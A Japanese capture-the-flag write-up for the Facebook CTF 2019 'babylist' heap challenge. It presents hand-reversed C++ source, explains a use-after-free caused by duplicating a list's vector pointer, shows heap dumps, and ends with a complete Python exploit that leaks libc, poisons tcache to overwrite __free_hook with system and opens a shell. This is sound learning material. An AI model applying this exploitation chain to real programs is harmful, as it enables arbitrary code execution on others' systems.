# [pwn 884pts] babylist - Facebook CTF 2019
64ビットで全部有効です。
```
$ checksec -f babylist
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		3	babylist
```

ヒープ系問題で、listをcreateし、要素をadd, viewできます。
また、listをduplicate, removeもできます。
C++製なので大変読みにくいですが、競技中に翻訳したデータが残っていました。

```c++
#include <iostream>
#include <stdlib.h>
#include <string.h>

void handler()
{
  std::cout << "Timeout" << std::endl;
}
void setup()
{
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  alarm(0x8c);
  sgnal(0xe, handler);
}

void welcome()
{
  std::cout << "Welcome to babylist!" << std::endl;
}

void create_list()
{
  int i;
  for(i = 0; i <= 9; i++) {
    if (lists[i] == NULL) {
      break;
    }
  }
  if (i == 10) {
    std::cout << "Sorry, no empty spot available :(" << std::endl;
    return;
  }
  lists[i] = new List(); // 0x88
  std::cout << "Enter name for list:" << std::endl;
  std::getline(std::cin, (char*)list[i]);
  std::cout << "List has been created!" << std::endl;
}

int read_index()
{
  std::cout << "Enter index of list:" << std::endl;
  if (index < -1 || index > 9 || list[index] == NULL) {
    std::cout << "Error: Invalid index" << std::endl;
    exit(-1);
  }
  return index;
}

void add_element()
{
  int index = read_index();
  int number;
  std::cout << "Enter number to add:" << std::endl;
  std::cin >> number;
  lists[index].add(number);
  std::cout << "Number successfully added to list!" << std::endl;
}

void view_element()
{
  int index = read_index();
  int target;
  std::cout << "Enter index into list:" << std::endl;
  std::cin >> target;
  std::cout << "[" << target << "] = " << lists[index].get(target) << std::endl;
}

void dup_list()
{
  int index;
  for(index = 0; index <= 9; index++) {
    if (lists[index] == NULL) {
      break;
    }
  }
  if (index == 10) {
    std::cout << "Sorry, no empty spot available :(" << std::endl;
    return;
  }
  int from = read_index();
  lists[index] = new List(); // 0x88
  memcpy(lists[index], lists[from], sizeof(List)); // 0x88
  std::cout << "Enter name for new list:" << std::endl;
  std::getline(std::cin, lists[index]);
  std::cout << "List has been duplicated!" << std::endl;
}

void delete_list()
{
  int index = read_index();
  memset(lists[index], 0, sizeof(List)); // 0x88
  if (lists[index]) {
    delete lists[index];
  }
  lists[index] = NULL;
  std::cout << "List has been deleted!" << std::endl;
}

int main()
{
  int choice;
  
  setup();
  welcome();

  while(1) {
    std::cin >> choice;
    switch(choice) {
    case 1:
      create_list();
      break;
    case 2:
      add_element();
      break;
    case 3:
      view_element();
      break;
    case 4:
      dup_list();
      break;
    case 5:
      remove_list();
      break;
    default:
      break;
    }
  }
  
  return 0;
}
```

Listは次のようになっています。
```c
typedef struct {
  char name[0x70];
  struct vector (std::vector);
} List;
```

脆弱性がなさそうに思えたのでwriteupを読んだところ、dupに脆弱性があるようです。
vectorのアドレスもコピーされるのですが、vectorはサイズが拡張されると一度freeされて新しいサイズでmallocされるのでUAFがあります。
つまり、dupした後にどちらかのvectorを拡張すれば両方に共有されるアドレスがfreeされて新しい領域が作られます。
新しい領域は拡張した方にしか適用されないので、もう一方のアドレスはfreeされたアドレスになっています。
なるほどぉ。

C++のバイナリは読めませんが、要素を追加する際は`push_back`を使っているようです。
次のようなコードを実行した後のヒープの状態を見てみましょう。

```python
create("AAAA") # 0
add(0, 0x1111)
add(0, 0x2222)
dup(0, "BBBB") # 1
```

```
0x557cc6265e70:	0x0000000041414141	0x0000000000000000
0x557cc6265e80:	0x0000000000000000	0x0000000000000000
0x557cc6265e90:	0x0000000000000000	0x0000000000000000
0x557cc6265ea0:	0x0000000000000000	0x0000000000000000
0x557cc6265eb0:	0x0000000000000000	0x0000000000000000
0x557cc6265ec0:	0x0000000000000000	0x0000000000000000
0x557cc6265ed0:	0x0000000000000000	0x0000000000000000
0x557cc6265ee0:	0x0000557cc6265f20	0x0000557cc6265f28
0x557cc6265ef0:	0x0000557cc6265f28	0x0000000000000021
0x557cc6265f00:	0x0000000000000000	0x0000000000000000
0x557cc6265f10:	0x0000000000000000	0x0000000000000021
0x557cc6265f20:	0x0000222200001111	0x0000000000000000
0x557cc6265f30:	0x0000000000000000	0x0000000000000091
0x557cc6265f40:	0x0000000042424242	0x0000000000000000
0x557cc6265f50:	0x0000000000000000	0x0000000000000000
0x557cc6265f60:	0x0000000000000000	0x0000000000000000
0x557cc6265f70:	0x0000000000000000	0x0000000000000000
0x557cc6265f80:	0x0000000000000000	0x0000000000000000
0x557cc6265f90:	0x0000000000000000	0x0000000000000000
0x557cc6265fa0:	0x0000000000000000	0x0000000000000000
0x557cc6265fb0:	0x0000557cc6265f20	0x0000557cc6265f28
0x557cc6265fc0:	0x0000557cc6265f28	0x000000000000f041
0x557cc6265fd0:	0x0000000000000000	0x0000000000000000
0x557cc6265fe0:	0x0000000000000000	0x0000000000000000
```

vectorのアドレスも共有されていることが分かるでしょう。
また、初期状態では0x18バイトまで値を入れられるので、4バイトの整数を6個まで格納できそうです。
しかし、調べてみたところ4個まで格納でき、5個目からはfree & mallocされるようです。
次のようなコードを実行してみましょう。
```python
create("AAAA") # 0
add(0, 0x1111)
add(0, 0x2222)
add(0, 0x3333)
add(0, 0x4444)
dup(0, "BBBB") # 1
add(0, 0x5555)
```

dup後のBBBBのアドレスがoriginalを指していることから、5回目のaddで0x56329d1fbfd0のチャンクが確保されたことが分かります。
```
pwndbg> x/64xg 0x56329d1fbe70
0x56329d1fbe70:	0x0000000041414141	0x0000000000000000
0x56329d1fbe80:	0x0000000000000000	0x0000000000000000
0x56329d1fbe90:	0x0000000000000000	0x0000000000000000
0x56329d1fbea0:	0x0000000000000000	0x0000000000000000
0x56329d1fbeb0:	0x0000000000000000	0x0000000000000000
0x56329d1fbec0:	0x0000000000000000	0x0000000000000000
0x56329d1fbed0:	0x0000000000000000	0x0000000000000000
0x56329d1fbee0:	0x000056329d1fbfd0	0x000056329d1fbfe4
0x56329d1fbef0:	0x000056329d1fbff0	0x0000000000000021 <-- original
0x56329d1fbf00:	0x000056329d1fbf20	0x0000444400003333
0x56329d1fbf10:	0x0000000000000000	0x0000000000000021 <-- ?
0x56329d1fbf20:	0x0000000000000000	0x0000000000000000
0x56329d1fbf30:	0x0000000000000000	0x0000000000000091
0x56329d1fbf40:	0x0000000042424242	0x0000000000000000
0x56329d1fbf50:	0x0000000000000000	0x0000000000000000
0x56329d1fbf60:	0x0000000000000000	0x0000000000000000
0x56329d1fbf70:	0x0000000000000000	0x0000000000000000
0x56329d1fbf80:	0x0000000000000000	0x0000000000000000
0x56329d1fbf90:	0x0000000000000000	0x0000000000000000
0x56329d1fbfa0:	0x0000000000000000	0x0000000000000000
0x56329d1fbfb0:	0x000056329d1fbf00	0x000056329d1fbf10
0x56329d1fbfc0:	0x000056329d1fbf10	0x0000000000000031 <-- add(0, 0x5555)
0x56329d1fbfd0:	0x0000222200001111	0x0000444400003333
0x56329d1fbfe0:	0x0000000000005555	0x0000000000000000
0x56329d1fbff0:	0x0000000000000000	0x000000000000f011
0x56329d1fc000:	0x0000000000000000	0x0000000000000000
0x56329d1fc010:	0x0000000000000000	0x0000000000000000
...
```

さて、tcacheが有効なので割と巨大なチャンクを作らないとunsorted binからlibc leakできませんが、tcacheを使い尽くせば0x78より大きいサイズで取得できます。
libc leakができたらあとはTCache Poisoningで`__free_hook`を書き換えます。
残念ながらone gadgetが動かなかったので`/bin/sh`を使いました。
最後に作った領域にaddするとfreeされるのでリストの最初の方を文字列として認識してsystem関数が起動します。

```python
from ptrlib import *
import re
import time

def create(name):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.sendline(name)

def add(index, value):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.sendline(str(index))
    sock.sendline(str(value))

def view(index, pos):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.sendline(str(index))
    sock.recvuntil("into list:\n")
    sock.sendline(str(pos))
    line = sock.recvline()
    r = re.findall(b"(.+)\[(.+)\] = (.+)", line)
    w = int(r[0][2])
    if w < 0:
        w = (0xffffffff ^ (- w - 1))
    return r[0][0], int(r[0][1]), w

def dup(index, name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.sendline(str(index))
    sock.sendline(name)

def remove(index):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.sendline(str(index))

libc = ELF("./libc-2.27.so")
sock = Process("./babylist")#Socket("localhost", 4001)
#sock = Socket("challenges3.fbctf.com", 1343)
main_arena = 0x3ebc40 + 0x60
one_gadget = 0x10a38c

create("0") # 0
for i in range(0x50 // 4):
    add(0, 0x1111)
dup(0, "1") # 1
for i in range(0x50 // 4):
    add(1, 0x2222)
create("libc leak") # 2
remove(1)

# fill up tcache for 0x21
for i in range(8):
    create(str(i)) # 3-9
remove(1)
for i in range(3, 9):
    remove(i)
remove(2)

# libc leak
addr_main_arena = (view(0, 1)[2] << 32) | view(0, 0)[2]
libc_base = addr_main_arena - main_arena
logger.info("libc base = " + hex(libc_base))

# double free
create("1") # 1
for i in range(8):
    add(1, 0xcafe)
dup(1, "PON") # 2
for i in range(8):
    add(1, i + 4)
    add(2, i + 4)

# TCache Poisoning
target = libc_base + libc.symbol('__free_hook') - 8
create("evil") # 3
add(3, target & 0xffffffff)
add(3, target >> 32)
for i in range(3):
    add(3, 0xdead)

#addr_one_gadget = libc_base + one_gadget
addr_system = libc_base + libc.symbol("system")
create("dummy") # 4
for i in range(5):
    add(4, 0xbeef)
create("free hook") # 5
add(5, u32("/bin"))
add(5, u32("/sh\x00"))
add(5, addr_system & 0xffffffff)
add(5, addr_system >> 32)
add(5, 0)

sock.interactive()
```

# 感想
これは素で解けるようになりたいなぁ。

# 参考文献
[1] [https://github.com/pr0cf5/CTF-writeups/tree/master/2019/fbctf/babylist](https://github.com/pr0cf5/CTF-writeups/tree/master/2019/fbctf/babylist)
[2] [http://eiki.hatenablog.jp/entry/20120223/1329993062](http://eiki.hatenablog.jp/entry/20120223/1329993062)
[3] [https://github.com/fbsamples/fbctf-2019-challenges/tree/master/pwnables/babylist](https://github.com/fbsamples/fbctf-2019-challenges/tree/master/pwnables/babylist)